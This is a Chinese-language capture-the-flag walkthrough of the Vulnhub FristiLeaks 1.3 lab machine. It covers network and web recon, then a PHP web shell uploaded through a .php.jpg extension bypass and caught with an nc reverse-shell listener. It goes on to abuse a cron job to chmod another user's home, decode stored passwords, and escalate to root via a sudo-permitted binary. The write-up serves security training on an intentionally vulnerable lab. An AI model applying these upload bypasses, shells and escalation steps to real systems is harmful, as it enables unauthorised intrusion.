# Vulnhub FristiLeaks 1.3


# Vulnhub-FristiLeaks 1.3

### 基本信息

kali: 192.168.110.10

靶机: 192.168.110.30

### 一、信息收集

```
└─# arp-scan --interface=eth1 -l
Interface: eth1, type: EN10MB, MAC: 00:50:56:a3:f5:91, IPv4: 192.168.110.10
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.110.1   00:50:56:a3:2e:39       VMware, Inc.
192.168.110.19  00:50:56:a3:bd:59       VMware, Inc.
192.168.110.18  00:50:56:a3:de:c6       VMware, Inc.
192.168.110.24  00:50:56:a3:b9:36       VMware, Inc.
192.168.110.28  00:50:56:a3:64:e8       VMware, Inc.
192.168.110.30  00:50:56:a3:c3:c2       VMware, Inc.

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.012 seconds (127.24 hosts/sec). 6 responded
```

```
└─# nmap -n 192.168.110.30
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-09 10:08 CST
Nmap scan report for 192.168.110.30
Host is up (0.00042s latency).
Not shown: 989 filtered tcp ports (no-response), 10 filtered tcp ports (host-prohibited)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:50:56:A3:C3:C2 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.07 seconds
```

```
dirb http://192.168.110.30
```

```
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Jul  9 10:09:44 2022
URL_BASE: http://192.168.110.30/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.110.30/ ----
+ http://192.168.110.30/cgi-bin/ (CODE:403|SIZE:210)
==> DIRECTORY: http://192.168.110.30/images/
+ http://192.168.110.30/index.html (CODE:200|SIZE:703)
+ http://192.168.110.30/robots.txt (CODE:200|SIZE:62)

---- Entering directory: http://192.168.110.30/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Sat Jul  9 10:09:48 2022
DOWNLOADED: 4612 - FOUND: 3
```

```
└─# curl 192.168.110.30/robots.txt
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```



```
http://192.168.110.30/fristi/
```



```
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->
```

```
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
```

```
base64 -d base64.txt > base64.jpg
```

```
eezeepz
keKkeKKeKKeKkEkkEk
```

### 二、漏洞利用

之后上传大马

只允许上传png、jpg、gif图片

```
t1p3.php -> t1p3.php.jpg
```

```
http://192.168.110.30/fristi/uploads/t1p3.php.jpg
```

```
nc -lvnp 1234
```

```
/home/eezeepz
```

```
cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks,
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The
output goes to the file "cronresult" in /tmp/. It should
run every minute with my account privileges.

- Jerry
```

```
cd /tmp
touch runthis
echo "/usr/bin/../../bin/chmod -R 777 /home/admin" > /tmp/runthis
```

```
cd /home/admin

cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

```
cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq
```



```
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
```



```
import base64
import codecs
import sys

def decodeString(str):
    string = str [::-1]
    string = string.encode('rot13')
    return base64.b64decode(string)
    
print decodeString(sys.argv[1])
```



```
mousepad base64decode.py
```



```
└─# python base64ecode.py mVGZ3O3omkJLmy2pcuTq
thisisalsopw123

└─# python base64ecode.py =RFn0AKnlMHMPIzpyuTI0ITG
LetThereBeFristi!
```



```
sh-4.1$ python -c 'import pty;pty.spawn("/bin/sh")'
```



```
su - fristigod
LetThereBeFristi!
```



```
-bash-4.1$ ls -a
ls -a
.  ..  .bash_history  .secret_admin_stuff
```

```
cd ./secret_admin_stuff

-bash-4.1$ ls
ls
doCom
-bash-4.1$ ./doCom
./doCom
Nice try, but wrong user ;)
```



```
-bash-4.1$ sudo -l
sudo -l
[sudo] password for fristigod: thisisalsopw123
Sorry, try again.
[sudo] password for fristigod: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
-bash-4.1$
```



```
-bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
```

```
-bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
```



```
cd /root/

bash-4.1# cat fristileaks_secrets.txt
cat fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```


